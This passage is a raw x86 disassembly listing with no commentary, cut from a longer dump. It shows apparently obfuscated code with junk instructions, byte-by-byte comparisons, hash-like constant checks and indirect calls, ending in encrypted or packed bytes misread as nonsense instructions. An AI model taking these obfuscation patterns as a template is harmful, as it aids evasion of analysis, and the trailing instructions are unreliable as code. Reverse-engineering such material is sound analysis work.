  41ebb3:	or     DWORD PTR ds:0x428e9d,0x2f2b
  41ebbd:	test   eax,eax
  41ebbf:	je     0x41e428
  41ebc5:	mov    DWORD PTR ds:0x428ec5,0x7907
  41ebcf:	mov    al,ds:0x4285ce
  41ebd4:	cmp    al,BYTE PTR ds:0x4285db
  41ebda:	mov    DWORD PTR ds:0x428e5d,0x5f7d
  41ebe4:	jne    0x41e428
  41ebea:	mov    DWORD PTR ds:0x428e3d,0x1797
  41ebf4:	mov    al,ds:0x4285e7
  41ebf9:	cmp    al,BYTE PTR ds:0x4285f8
  41ebff:	jne    0x41e428
  41ec05:	add    DWORD PTR ds:0x428ec1,0x428ead
  41ec0f:	push   0x428601
  41ec14:	push   0x42860d
  41ec19:	call   edi
  41ec1b:	test   eax,eax
  41ec1d:	mov    DWORD PTR ds:0x428e69,0x333a
  41ec27:	je     0x41e428
  41ec2d:	mov    al,ds:0x42861e
  41ec32:	cmp    al,BYTE PTR ds:0x42862b
  41ec38:	mov    DWORD PTR ds:0x428e65,0x2ea7
  41ec42:	jne    0x41e428
  41ec48:	mov    DWORD PTR ds:0x428e85,0x19a
  41ec52:	mov    al,ds:0x428637
  41ec57:	mov    DWORD PTR ds:0x428ec5,0xb46
  41ec61:	cmp    al,BYTE PTR ds:0x428648
  41ec67:	mov    DWORD PTR ds:0x428e91,0x2cce
  41ec71:	jne    0x41e428
  41ec77:	push   0x428651
  41ec7c:	add    DWORD PTR ds:0x428eb1,0x428ea5
  41ec86:	push   0x42865d
  41ec8b:	call   edi
  41ec8d:	test   eax,eax
  41ec8f:	mov    DWORD PTR ds:0x428e7d,0x28e1
  41ec99:	je     0x41e428
  41ec9f:	mov    al,ds:0x42866e
  41eca4:	mov    DWORD PTR ds:0x428e35,0x7fda
  41ecae:	cmp    al,BYTE PTR ds:0x42867b
  41ecb4:	mov    DWORD PTR ds:0x428eb5,0x205
  41ecbe:	jne    0x41e428
  41ecc4:	mov    DWORD PTR ds:0x428ea9,0x1bc1
  41ecce:	mov    al,ds:0x428687
  41ecd3:	mov    DWORD PTR ds:0x428e31,0xcbc
  41ecdd:	cmp    al,BYTE PTR ds:0x428698
  41ece3:	jne    0x41e428
  41ece9:	xor    DWORD PTR ds:0x428e75,0x428e55
  41ecf3:	push   0x4286a1
  41ecf8:	push   0x4286ad
  41ecfd:	call   edi
  41ecff:	or     DWORD PTR ds:0x428eb9,0x1b73
  41ed09:	test   eax,eax
  41ed0b:	je     0x41e428
  41ed11:	mov    al,ds:0x4286be
  41ed16:	mov    DWORD PTR ds:0x428ebd,0x533
  41ed20:	cmp    al,BYTE PTR ds:0x4286cb
  41ed26:	mov    DWORD PTR ds:0x428eb1,0x6a19
  41ed30:	jne    0x41e428
  41ed36:	mov    DWORD PTR ds:0x428e79,0x3b4e
  41ed40:	mov    al,ds:0x4286d7
  41ed45:	mov    DWORD PTR ds:0x428e79,0x665f
  41ed4f:	cmp    al,BYTE PTR ds:0x4286e8
  41ed55:	jne    0x41e428
  41ed5b:	xor    DWORD PTR ds:0x428ead,0x43e0
  41ed65:	push   0x4286f1
  41ed6a:	push   0x4286fd
  41ed6f:	add    DWORD PTR ds:0x428eb1,0x428e79
  41ed79:	call   edi
  41ed7b:	and    DWORD PTR ds:0x428e7d,0x428e25
  41ed85:	test   eax,eax
  41ed87:	je     0x41e428
  41ed8d:	mov    al,ds:0x42870e
  41ed92:	mov    DWORD PTR ds:0x428e59,0x5b53
  41ed9c:	cmp    al,BYTE PTR ds:0x42871b
  41eda2:	jne    0x41e428
  41eda8:	mov    DWORD PTR ds:0x428e25,0x5848
  41edb2:	mov    al,ds:0x428727
  41edb7:	mov    DWORD PTR ds:0x428e75,0x6f79
  41edc1:	cmp    al,BYTE PTR ds:0x428738
  41edc7:	jne    0x41e428
  41edcd:	push   0x428741
  41edd2:	push   0x42874d
  41edd7:	call   edi
  41edd9:	sub    DWORD PTR ds:0x428e75,0x1f6e
  41ede3:	test   eax,eax
  41ede5:	je     0x41e428
  41edeb:	mov    al,ds:0x42875e
  41edf0:	mov    DWORD PTR ds:0x428ea9,0x6a75
  41edfa:	cmp    al,BYTE PTR ds:0x42876b
  41ee00:	mov    DWORD PTR ds:0x428e95,0x5296
  41ee0a:	jne    0x41e428
  41ee10:	mov    DWORD PTR ds:0x428e65,0x352f
  41ee1a:	mov    al,ds:0x428777
  41ee1f:	cmp    al,BYTE PTR ds:0x428788
  41ee25:	mov    DWORD PTR ds:0x428e39,0x65de
  41ee2f:	jne    0x41e428
  41ee35:	add    DWORD PTR ds:0x428ec5,0x39e0
  41ee3f:	push   0x428791
  41ee44:	sbb    DWORD PTR ds:0x428ec5,0x70eb
  41ee4e:	push   0x42879d
  41ee53:	add    DWORD PTR ds:0x428e75,0x6377
  41ee5d:	call   edi
  41ee5f:	test   eax,eax
  41ee61:	je     0x41e428
  41ee67:	mov    al,ds:0x4287ae
  41ee6c:	cmp    al,BYTE PTR ds:0x4287bb
  41ee72:	mov    DWORD PTR ds:0x428e75,0xc68
  41ee7c:	jne    0x41e428
  41ee82:	mov    DWORD PTR ds:0x428ea9,0x47d0
  41ee8c:	mov    al,ds:0x4287c7
  41ee91:	mov    DWORD PTR ds:0x428e35,0x2f08
  41ee9b:	cmp    al,BYTE PTR ds:0x4287d8
  41eea1:	mov    DWORD PTR ds:0x428e31,0x4709
  41eeab:	jne    0x41e428
  41eeb1:	sbb    DWORD PTR ds:0x428eb1,0x2bd9
  41eebb:	push   0x4287e1
  41eec0:	or     DWORD PTR ds:0x428e79,0x428ead
  41eeca:	push   0x4287ed
  41eecf:	adc    DWORD PTR ds:0x428ea1,0x22ee
  41eed9:	call   edi
  41eedb:	adc    DWORD PTR ds:0x428ecd,0x428ec5
  41eee5:	test   eax,eax
  41eee7:	mov    DWORD PTR ds:0x428e79,0x242c
  41eef1:	je     0x41e428
  41eef7:	mov    DWORD PTR ds:0x428e3d,0x326f
  41ef01:	mov    al,ds:0x4287fe
  41ef06:	mov    DWORD PTR ds:0x428eb9,0x8d5
  41ef10:	cmp    al,BYTE PTR ds:0x42880b
  41ef16:	mov    DWORD PTR ds:0x428e59,0x136
  41ef20:	jne    0x41e428
  41ef26:	mov    al,ds:0x428817
  41ef2b:	mov    DWORD PTR ds:0x428eb1,0x1632
  41ef35:	cmp    al,BYTE PTR ds:0x428828
  41ef3b:	mov    DWORD PTR ds:0x428e65,0x63ac
  41ef45:	jne    0x41e428
  41ef4b:	sub    DWORD PTR ds:0x428e59,0x428e31
  41ef55:	push   0x428831
  41ef5a:	push   0x42883d
  41ef5f:	mov    DWORD PTR ds:0x428e25,0x5d60
  41ef69:	call   edi
  41ef6b:	test   eax,eax
  41ef6d:	je     0x41e428
  41ef73:	mov    al,ds:0x42884e
  41ef78:	mov    DWORD PTR ds:0x428eb5,0x1dcb
  41ef82:	cmp    al,BYTE PTR ds:0x42885b
  41ef88:	mov    DWORD PTR ds:0x428eb5,0x40d0
  41ef92:	jne    0x41e428
  41ef98:	mov    al,ds:0x428867
  41ef9d:	mov    DWORD PTR ds:0x428ead,0x41e1
  41efa7:	cmp    al,BYTE PTR ds:0x428878
  41efad:	mov    DWORD PTR ds:0x428e31,0x6c07
  41efb7:	jne    0x41e428
  41efbd:	adc    DWORD PTR ds:0x428ea5,0x428ec9
  41efc7:	push   0x428881
  41efcc:	adc    DWORD PTR ds:0x428eb5,0x37c3
  41efd6:	push   0x42888d
  41efdb:	call   edi
  41efdd:	sub    DWORD PTR ds:0x428e31,0x47c0
  41efe7:	test   eax,eax
  41efe9:	mov    DWORD PTR ds:0x428e91,0x23ba
  41eff3:	je     0x41e428
  41eff9:	mov    DWORD PTR ds:0x428ea5,0x1cf7
  41f003:	mov    al,ds:0x42889e
  41f008:	mov    DWORD PTR ds:0x428e25,0x6ea3
  41f012:	cmp    al,BYTE PTR ds:0x4288ab
  41f018:	jne    0x41e428
  41f01e:	mov    DWORD PTR ds:0x428e95,0x9ed
  41f028:	mov    al,ds:0x4288b7
  41f02d:	mov    DWORD PTR ds:0x428e75,0x600
  41f037:	cmp    al,BYTE PTR ds:0x4288c8
  41f03d:	mov    DWORD PTR ds:0x428ead,0x4d3e
  41f047:	jne    0x41e428
  41f04d:	push   0x4288d1
  41f052:	push   0x4288dd
  41f057:	sbb    DWORD PTR ds:0x428ebd,0x717e
  41f061:	call   edi
  41f063:	sub    DWORD PTR ds:0x428e79,0x428e69
  41f06d:	test   eax,eax
  41f06f:	je     0x41e428
  41f075:	mov    al,ds:0x4288ee
  41f07a:	cmp    al,BYTE PTR ds:0x4288fb
  41f080:	jne    0x41e428
  41f086:	mov    al,ds:0x428907
  41f08b:	cmp    al,BYTE PTR ds:0x428918
  41f091:	jne    0x41e428
  41f097:	push   0x428921
  41f09c:	push   0x42892d
  41f0a1:	call   edi
  41f0a3:	test   eax,eax
  41f0a5:	je     0x41e428
  41f0ab:	mov    al,ds:0x42893e
  41f0b0:	cmp    al,BYTE PTR ds:0x42894b
  41f0b6:	jne    0x41e428
  41f0bc:	mov    al,ds:0x428957
  41f0c1:	cmp    al,BYTE PTR ds:0x428968
  41f0c7:	jne    0x41e428
  41f0cd:	push   0x428971
  41f0d2:	push   0x42897d
  41f0d7:	call   edi
  41f0d9:	test   eax,eax
  41f0db:	je     0x41e428
  41f0e1:	mov    al,ds:0x42898e
  41f0e6:	cmp    al,BYTE PTR ds:0x42899b
  41f0ec:	jne    0x41e428
  41f0f2:	mov    al,ds:0x4289a7
  41f0f7:	cmp    al,BYTE PTR ds:0x4289b8
  41f0fd:	jne    0x41e428
  41f103:	push   0x4289c1
  41f108:	push   0x4289cd
  41f10d:	call   edi
  41f10f:	test   eax,eax
  41f111:	je     0x41e428
  41f117:	mov    al,ds:0x4289de
  41f11c:	cmp    al,BYTE PTR ds:0x4289eb
  41f122:	jne    0x41e428
  41f128:	mov    al,ds:0x4289f7
  41f12d:	cmp    al,BYTE PTR ds:0x428a08
  41f133:	jne    0x41e428
  41f139:	push   0x428a11
  41f13e:	push   0x428a1d
  41f143:	call   edi
  41f145:	test   eax,eax
  41f147:	je     0x41e428
  41f14d:	mov    al,ds:0x428a2e
  41f152:	cmp    al,BYTE PTR ds:0x428a3b
  41f158:	jne    0x41e428
  41f15e:	mov    al,ds:0x428a47
  41f163:	cmp    al,BYTE PTR ds:0x428a58
  41f169:	jne    0x41e428
  41f16f:	push   0x428a61
  41f174:	push   0x428a6d
  41f179:	call   edi
  41f17b:	test   eax,eax
  41f17d:	je     0x41e428
  41f183:	mov    al,ds:0x428a7e
  41f188:	cmp    al,BYTE PTR ds:0x428a8b
  41f18e:	jne    0x41e428
  41f194:	mov    al,ds:0x428a97
  41f199:	cmp    al,BYTE PTR ds:0x428aa8
  41f19f:	jne    0x41e428
  41f1a5:	push   0x428ab1
  41f1aa:	push   0x428abd
  41f1af:	call   edi
  41f1b1:	test   eax,eax
  41f1b3:	je     0x41e428
  41f1b9:	mov    al,ds:0x428ace
  41f1be:	cmp    al,BYTE PTR ds:0x428adb
  41f1c4:	jne    0x41e428
  41f1ca:	mov    al,ds:0x428ae7
  41f1cf:	cmp    al,BYTE PTR ds:0x428af8
  41f1d5:	jne    0x41e428
  41f1db:	push   0x428b01
  41f1e0:	push   0x428b0d
  41f1e5:	call   edi
  41f1e7:	test   eax,eax
  41f1e9:	je     0x41e428
  41f1ef:	mov    al,ds:0x428b1e
  41f1f4:	cmp    al,BYTE PTR ds:0x428b2b
  41f1fa:	jne    0x41e428
  41f200:	mov    al,ds:0x428b37
  41f205:	cmp    al,BYTE PTR ds:0x428b48
  41f20b:	jne    0x41e428
  41f211:	push   0x428b51
  41f216:	push   0x428b5d
  41f21b:	call   edi
  41f21d:	test   eax,eax
  41f21f:	je     0x41e428
  41f225:	mov    al,ds:0x428b6e
  41f22a:	cmp    al,BYTE PTR ds:0x428b7b
  41f230:	jne    0x41e428
  41f236:	mov    al,ds:0x428b87
  41f23b:	cmp    al,BYTE PTR ds:0x428b98
  41f241:	jne    0x41e428
  41f247:	push   0x428ba1
  41f24c:	push   0x428bad
  41f251:	call   edi
  41f253:	test   eax,eax
  41f255:	je     0x41e428
  41f25b:	mov    al,ds:0x428bbe
  41f260:	cmp    al,BYTE PTR ds:0x428bcb
  41f266:	jne    0x41e428
  41f26c:	mov    al,ds:0x428bd7
  41f271:	cmp    al,BYTE PTR ds:0x428be8
  41f277:	jne    0x41e428
  41f27d:	push   0x428bf1
  41f282:	push   0x428bfd
  41f287:	call   edi
  41f289:	test   eax,eax
  41f28b:	je     0x41e428
  41f291:	mov    eax,DWORD PTR [esp+0x3c]
  41f295:	cmp    eax,0xf89c85b8
  41f29a:	je     0x41f2f9
  41f2a0:	mov    eax,DWORD PTR [esp+0x28]
  41f2a4:	mov    ecx,DWORD PTR [esp+0x38]
  41f2a8:	xor    eax,esi
  41f2aa:	add    eax,ebx
  41f2ac:	cmp    eax,ecx
  41f2ae:	je     0x41f2f9
  41f2b4:	mov    eax,ds:0x428365
  41f2b9:	mov    eax,DWORD PTR [eax+0x194]
  41f2bf:	mov    ecx,DWORD PTR [eax]
  41f2c1:	mov    eax,DWORD PTR [ecx+0x3c]
  41f2c4:	push   DWORD PTR ds:0x428445
  41f2ca:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  41f2ce:	push   DWORD PTR ds:0x4281e9
  41f2d4:	add    eax,ecx
  41f2d6:	mov    ecx,DWORD PTR ds:0x428365
  41f2dc:	mov    ecx,DWORD PTR [ecx+0x194]
  41f2e2:	push   DWORD PTR [ecx]
  41f2e4:	call   eax
  41f2e6:	mov    ecx,DWORD PTR ds:0x428365
  41f2ec:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41f2f2:	mov    DWORD PTR [ecx],eax
  41f2f4:	jmp    0x41f4f3
  41f2f9:	mov    eax,DWORD PTR [esp+0x28]
  41f2fd:	mov    ecx,DWORD PTR [esp+0x40]
  41f301:	xor    eax,esi
  41f303:	add    eax,ebx
  41f305:	cmp    eax,ecx
  41f307:	jne    0x41f372
  41f30d:	mov    eax,DWORD PTR [esp+0x28]
  41f311:	mov    ecx,DWORD PTR ds:0x428365
  41f317:	mov    ecx,DWORD PTR [ecx+0x198]
  41f31d:	xor    eax,esi
  41f31f:	add    eax,ebx
  41f321:	cmp    eax,DWORD PTR [ecx]
  41f323:	jne    0x41f34b
  41f329:	mov    eax,DWORD PTR [esp+0x28]
  41f32d:	push   0xffffffff
  41f32f:	push   0x70941f8a
  41f334:	xor    eax,esi
  41f336:	add    eax,ebx
  41f338:	push   eax
  41f339:	push   0xf89c85bd
  41f33e:	push   DWORD PTR [esp+0x1c]
  41f342:	push   DWORD PTR [esp+0x3c]
  41f346:	call   0x417181
  41f34b:	push   DWORD PTR [esp+0xc]
  41f34f:	push   DWORD PTR [esp+0x2c]
  41f353:	call   0x401000
  41f358:	mov    eax,DWORD PTR [esp+0x28]
  41f35c:	xor    eax,esi
  41f35e:	add    eax,ebx
  41f360:	mov    ds:0x4283f1,eax
  41f365:	mov    eax,DWORD PTR [esp+0x28]
  41f369:	xor    eax,esi
  41f36b:	add    eax,ebx
  41f36d:	mov    ds:0x4283e9,eax
  41f372:	mov    eax,DWORD PTR [esp+0x24]
  41f376:	test   eax,eax
  41f378:	je     0x41f4f3
  41f37e:	mov    DWORD PTR [esp+0x4c],0xf152c20
  41f386:	mov    DWORD PTR [esp+0x54],0x712edcf
  41f38e:	mov    DWORD PTR [esp+0x48],0x373fc11
  41f396:	mov    DWORD PTR [esp+0x50],0x72670ac1
  41f39e:	call   0x414ac6
  41f3a3:	mov    eax,DWORD PTR [esp+0x34]
  41f3a7:	mov    eax,DWORD PTR [esp+0xc]
  41f3ab:	mov    DWORD PTR [esp+0x30],eax
  41f3af:	mov    eax,DWORD PTR [esp+0x28]
  41f3b3:	mov    DWORD PTR [esp+0xc],eax
  41f3b7:	mov    eax,eax
  41f3b9:	mov    eax,ds:0x428365
  41f3be:	mov    ecx,DWORD PTR [eax+0x1c0]
  41f3c4:	mov    edx,DWORD PTR [ecx]
  41f3c6:	and    DWORD PTR [esp+0x14],0x0
  41f3cb:	mov    edi,0xfabdbecf
  41f3d0:	add    edx,edi
  41f3d2:	adc    DWORD PTR [esp+0x14],0xffffffff
  41f3d7:	mov    ecx,0x8a29a145
  41f3dc:	xor    edx,ecx
  41f3de:	mov    DWORD PTR [esp+0x18],edx
  41f3e2:	mov    edx,DWORD PTR [esp+0x14]
  41f3e6:	xor    edx,0x0
  41f3e9:	cmp    DWORD PTR [esp+0x18],0x70941f95
  41f3f1:	mov    DWORD PTR [esp+0x1c],edx
  41f3f5:	jne    0x41f427
  41f3fb:	cmp    edx,0xffffffff
  41f3fe:	jne    0x41f427
  41f404:	mov    eax,ds:0x4283e9
  41f409:	mov    edx,DWORD PTR ds:0x4283f1
  41f40f:	xor    eax,edx
  41f411:	mov    ds:0x4283e9,eax
  41f416:	mov    edx,DWORD PTR ds:0x4283e9
  41f41c:	mov    eax,DWORD PTR [esp+0x24]
  41f420:	add    DWORD PTR [eax],edx
  41f422:	jmp    0x41f4b4
  41f427:	mov    eax,DWORD PTR [eax+0x1c8]
  41f42d:	mov    eax,DWORD PTR [eax]
  41f42f:	cdq    
  41f430:	add    eax,edi
  41f432:	adc    edx,0xffffffff
  41f435:	and    DWORD PTR [esp+0x14],0x0
  41f43a:	xor    edx,0x0
  41f43d:	mov    DWORD PTR [esp+0x2c],edx
  41f441:	mov    edx,DWORD PTR [esp+0xc]
  41f445:	mov    DWORD PTR [esp+0x10],edx
  41f449:	xor    eax,ecx
  41f44b:	add    DWORD PTR [esp+0x10],edi
  41f44f:	mov    edx,DWORD PTR [esp+0x10]
  41f453:	adc    DWORD PTR [esp+0x14],0xffffffff
  41f458:	xor    edx,ecx
  41f45a:	mov    DWORD PTR [esp+0x18],edx
  41f45e:	mov    edx,DWORD PTR [esp+0x14]
  41f462:	xor    edx,0x0
  41f465:	mov    DWORD PTR [esp+0x1c],edx
  41f469:	cmp    DWORD PTR [esp+0x18],eax
  41f46d:	jne    0x41f47f
  41f473:	mov    eax,DWORD PTR [esp+0x2c]
  41f477:	cmp    edx,eax
  41f479:	je     0x41f490
  41f47f:	mov    eax,DWORD PTR [esp+0xc]
  41f483:	add    eax,DWORD PTR [esp+0x30]
  41f487:	mov    DWORD PTR [esp+0xc],eax
  41f48b:	jmp    0x41f4f3
  41f490:	mov    eax,ds:0x4283e9
  41f495:	mov    edx,DWORD PTR ds:0x4283f1
  41f49b:	xor    eax,edx
  41f49d:	mov    ds:0x4283e9,eax
  41f4a2:	mov    eax,DWORD PTR [esp+0x24]
  41f4a6:	mov    edx,DWORD PTR ds:0x4283e9
  41f4ac:	add    edx,DWORD PTR [eax]
  41f4ae:	mov    eax,DWORD PTR [esp+0x24]
  41f4b2:	mov    DWORD PTR [eax],edx
  41f4b4:	mov    edx,DWORD PTR [esp+0xc]
  41f4b8:	mov    eax,ds:0x4283e9
  41f4bd:	xor    edx,esi
  41f4bf:	add    edx,ebx
  41f4c1:	xor    ebx,ebx
  41f4c3:	add    edx,edi
  41f4c5:	adc    ebx,0xffffffff
  41f4c8:	xor    esi,esi
  41f4ca:	xor    edx,ecx
  41f4cc:	xor    ebx,0x0
  41f4cf:	add    eax,edi
  41f4d1:	adc    esi,0xffffffff
  41f4d4:	xor    eax,ecx
  41f4d6:	xor    esi,0x0
  41f4d9:	cmp    eax,edx
  41f4db:	jne    0x41f4f3
  41f4e1:	cmp    esi,ebx
  41f4e3:	jne    0x41f4f3
  41f4e9:	mov    eax,ds:0x4283e9
  41f4ee:	mov    ds:0x4283f1,eax
  41f4f3:	mov    eax,ds:0x428365
  41f4f8:	push   0x4
  41f4fa:	add    eax,0x1cc
  41f4ff:	push   eax
  41f500:	lea    eax,[esp+0x3c]
  41f504:	push   eax
  41f505:	call   0x41f519
  41f50a:	mov    eax,DWORD PTR [esp+0x34]
  41f50e:	mov    eax,DWORD PTR [eax]
  41f510:	pop    edi
  41f511:	pop    esi
  41f512:	pop    ebx
  41f513:	mov    esp,ebp
  41f515:	pop    ebp
  41f516:	ret    0xc
  41f519:	push   ebp
  41f51a:	mov    ebp,esp
  41f51c:	sub    esp,0x10
  41f51f:	mov    DWORD PTR ds:0x428e69,0x19
  41f529:	cmp    DWORD PTR ds:0x428e69,0x0
  41f530:	je     0x41f565
  41f536:	cmp    DWORD PTR ds:0x428e69,0x1f
  41f53d:	jge    0x41f565
  41f543:	jmp    0x41f553
  41f548:	push   0x4280ab
  41f54d:	call   DWORD PTR ds:0x42ca30
  41f553:	mov    edx,DWORD PTR ds:0x428e69
  41f559:	dec    edx
  41f55a:	mov    DWORD PTR ds:0x428e69,edx
  41f560:	jmp    0x41f529
  41f565:	mov    eax,0xf89c85b9
  41f56a:	mov    DWORD PTR [ebp-0x4],eax
  41f56d:	or     ecx,edx
  41f56f:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  41f576:	sbb    DWORD PTR ds:0x428e35,ecx
  41f57c:	mov    ecx,DWORD PTR [ebp-0x4]
  41f57f:	sbb    DWORD PTR ds:0x428e95,edi
  41f585:	push   esi
  41f586:	mov    edx,0x75108b1
  41f58b:	inc    DWORD PTR ds:0x428e49
  41f591:	xor    ecx,edx
  41f593:	sub    DWORD PTR ds:0x428ed1,edx
  41f599:	mov    esi,0x3272f8
  41f59e:	adc    DWORD PTR ds:0x428e41,0x428e31
  41f5a8:	push   edi
  41f5a9:	mov    edi,DWORD PTR [ebp+0x10]
  41f5ac:	xor    DWORD PTR ds:0x428e7d,0x428e91
  41f5b6:	add    ecx,esi
  41f5b8:	mov    DWORD PTR ds:0x428e59,0x285e
  41f5c2:	cmp    ecx,edi
  41f5c4:	je     0x423f13
  41f5ca:	and    DWORD PTR ds:0x428ec9,0x0
  41f5d4:	xor    ecx,ecx
  41f5d6:	add    ecx,DWORD PTR ds:0x428ec9
  41f5dc:	inc    ecx
  41f5dd:	mov    DWORD PTR ds:0x428ec9,ecx
  41f5e3:	cmp    DWORD PTR ds:0x428ec9,0x4
  41f5ea:	ja     0x41f629
  41f5f0:	jmp    0x41f600
  41f5f5:	push   0x5d76
  41f5fa:	call   DWORD PTR ds:0x42ca38
  41f600:	cmp    DWORD PTR ds:0x428ec9,0x3
  41f607:	jne    0x41f61c
  41f60d:	xor    ecx,ecx
  41f60f:	or     ecx,DWORD PTR ds:0x428ec9
  41f615:	inc    ecx
  41f616:	mov    DWORD PTR ds:0x428ec9,ecx
  41f61c:	cmp    DWORD PTR ds:0x428ec9,0x1c
  41f623:	jb     0x41f5d4
  41f629:	mov    ecx,DWORD PTR [ebp-0x4]
  41f62c:	xor    edi,edi
  41f62e:	xor    edi,DWORD PTR ds:0x428e39
  41f634:	or     DWORD PTR ds:0x428e25,edi
  41f63a:	mov    edi,DWORD PTR [ebp+0x10]
  41f63d:	and    DWORD PTR ds:0x428e55,0x428e29
  41f647:	xor    eax,eax
  41f649:	add    DWORD PTR ds:0x428e91,0x4be1
  41f653:	xor    ecx,edx
  41f655:	adc    DWORD PTR ds:0x428e81,0x428e69
  41f65f:	add    ecx,esi
  41f661:	add    edi,0xfabdbecf
  41f667:	adc    eax,0xffffffff
  41f66a:	and    DWORD PTR ds:0x428e39,0x428ec1
  41f674:	xor    eax,0x0
  41f677:	xor    DWORD PTR ds:0x428e75,0x428e29
  41f681:	mov    DWORD PTR [ebp-0xc],eax
  41f684:	push   ebx
  41f685:	xor    ebx,ebx
  41f687:	and    DWORD PTR ds:0x428ea1,0x0
  41f691:	jmp    0x41f6a4
  41f696:	xor    eax,eax
  41f698:	xor    eax,DWORD PTR ds:0x428ea1
  41f69e:	inc    eax
  41f69f:	mov    ds:0x428ea1,eax
  41f6a4:	cmp    DWORD PTR ds:0x428ea1,0x14
  41f6ab:	jae    0x41f6f4
  41f6b1:	cmp    DWORD PTR ds:0x428ea1,0xa
  41f6b8:	jle    0x41f6f4
  41f6be:	jmp    0x41f6d7
  41f6c3:	push   DWORD PTR [ebp-0x14]
  41f6c6:	push   DWORD PTR [ebp-0xc]
  41f6c9:	push   0x22e9
  41f6ce:	push   DWORD PTR [ebp-0x18]
  41f6d1:	call   DWORD PTR ds:0x42ca3c
  41f6d7:	cmp    DWORD PTR ds:0x428ea1,0x9
  41f6de:	jne    0x41f6ef
  41f6e4:	mov    eax,ds:0x428ea1
  41f6e9:	inc    eax
  41f6ea:	mov    ds:0x428ea1,eax
  41f6ef:	jmp    0x41f696
  41f6f4:	xor    edi,0x8a29a145
  41f6fa:	mov    eax,ecx
  41f6fc:	add    eax,0xfabdbecf
  41f701:	adc    ebx,0xffffffff
  41f704:	xor    eax,0x8a29a145
  41f709:	xor    ebx,0x0
  41f70c:	cmp    eax,edi
  41f70e:	jmp    0x421acd
  41f713:	pop    ebx
  41f714:	popf   
  41f715:	cwde   
  41f716:	jo     0x41f772
  41f718:	jp     0x41f77d
  41f71a:	mov    dl,0xe1
  41f71c:	cmp    eax,0x3e160de9
  41f721:	sub    ecx,DWORD PTR [ebp-0x7f]
  41f724:	and    al,0x7c
  41f726:	jnp    0x41f745
  41f728:	sahf   
  41f729:	jnp    0x41f7a6
  41f72b:	out    0x13,eax
  41f72d:	into   
  41f72e:	cmc    
  41f72f:	(bad)  
  41f731:	mov    ebx,0x1e2f79b8
  41f736:	inc    edi
  41f737:	sahf   
  41f738:	adc    eax,0x6ae1cae1
  41f73d:	mov    ebx,0x29945fe5
  41f742:	mov    ch,0xec
  41f744:	jg     0x41f712
  41f746:	mov    ah,0xc9
  41f748:	cld    
  41f749:	add    edx,eax
  41f74b:	inc    ecx
  41f74c:	mov    bh,0x4a
  41f74e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f74f:	push   cs
  41f750:	sub    al,0x5b
  41f752:	fld    QWORD PTR [ecx-0x8cc124d]
  41f758:	mov    cl,dh
  41f75a:	std    
  41f75b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f75c:	mov    BYTE PTR [eax],cl
  41f75e:	xor    ebx,DWORD PTR [ecx*1-0x5f2a88f5]
  41f765:	out    dx,al
  41f766:	aad    0xa1
  41f768:	dec    esi
  41f769:	mov    cl,0xdb
  41f76b:	sbb    eax,0xb02e16fc
  41f770:	enter  0x250,0xee
  41f774:	push   eax
  41f775:	pop    edi
  41f776:	(bad)  
  41f777:	leave  
  41f778:	lods   eax,DWORD PTR ds:[esi]
  41f779:	mov    esi,0x13745b05
  41f77e:	or     DWORD PTR [eax-0x3a41826e],ebp
  41f784:	shl    BYTE PTR [ecx+0x7ce4f31f],0xdc
  41f78b:	add    ecx,DWORD PTR [ebp-0x12263891]
  41f791:	add    al,0xa7
  41f793:	xchg   edi,eax
  41f794:	imul   edi,DWORD PTR [ebp+0x53929083],0xffffff84
  41f79b:	xor    eax,ecx
  41f79d:	stc    
  41f79e:	data16 or BYTE PTR cs:[eax-0x19d4f045],cl
  41f7a6:	loope  0x41f800
  41f7a8:	into   
  41f7a9:	jle    0x41f77d
  41f7ab:	mov    ecx,0xf3615c9c
  41f7b0:	int3   
  41f7b1:	je     0x41f747
  41f7b3:	(bad)  
  41f7b4:	in     eax,0x28
  41f7b6:	rcr    bh,cl
  41f7b8:	(bad)  
  41f7b9:	int3   
  41f7ba:	cmp    al,0x56
  41f7bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7bd:	daa    
  41f7be:	xchg   edi,eax
  41f7bf:	sar    ch,1
  41f7c1:	or     al,cl
  41f7c3:	push   edx
  41f7c4:	lea    ebp,[ebx-0x31]
  41f7c7:	jmp    0x41f7e8
  41f7c9:	stos   DWORD PTR es:[edi],eax
  41f7ca:	mov    ebp,0x790374f9
  41f7cf:	scas   al,BYTE PTR es:[edi]
  41f7d0:	or     DWORD PTR [ebx+0x38c3e438],0xffffffb2
  41f7d7:	call   0x2a17bd3f
  41f7dc:	(bad)  [ecx+0x7b2b46bb]
  41f7e2:	xlat   BYTE PTR ds:[ebx]
  41f7e3:	add    dl,al
  41f7e5:	or     ebx,DWORD PTR fs:[eax+0x10935966]
  41f7ec:	xor    eax,0x1d83c456
  41f7f1:	rcr    BYTE PTR [edx],1
  41f7f3:	mov    ds:0x2d04584f,eax
  41f7f8:	xchg   esi,eax
  41f7f9:	std    
  41f7fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f7fb:	fsub   DWORD PTR [esi]
  41f7fd:	jo     0x41f7a6
  41f7ff:	inc    esi
  41f800:	aad    0x3d
  41f802:	cmp    ebp,DWORD PTR [ecx+0x5e]
  41f805:	or     al,0xd6
  41f807:	inc    ebp
  41f808:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f809:	mov    ch,0x86
  41f80b:	cmp    ebx,0xf0863091
  41f811:	cld    
  41f812:	push   ebx
  41f813:	sub    DWORD PTR [ebx-0x2d],edi
  41f816:	dec    ebp
  41f817:	loope  0x41f82d
  41f819:	lea    ebx,[ebx+0x6d543c65]
  41f81f:	repz pop edx
  41f821:	loopne 0x41f7f5
  41f823:	xchg   esp,eax
  41f824:	ret    0x57c0
  41f827:	mov    dh,0xe3
  41f829:	xchg   esp,eax
  41f82a:	sbb    BYTE PTR [ecx-0x6786d671],dl
  41f830:	push   esp
  41f831:	and    DWORD PTR [eax+0x4b],edx
  41f834:	push   DWORD PTR [esi-0x17]
  41f837:	int3   
  41f838:	lods   eax,DWORD PTR ds:[esi]
  41f839:	mov    esp,0xe1af79f0
  41f83e:	sub    DWORD PTR [eax],edi
  41f840:	(bad)  
  41f841:	pushf  
  41f842:	ins    DWORD PTR es:[edi],dx
  41f843:	mov    eax,ds:0xf59d241f
  41f848:	pop    edi
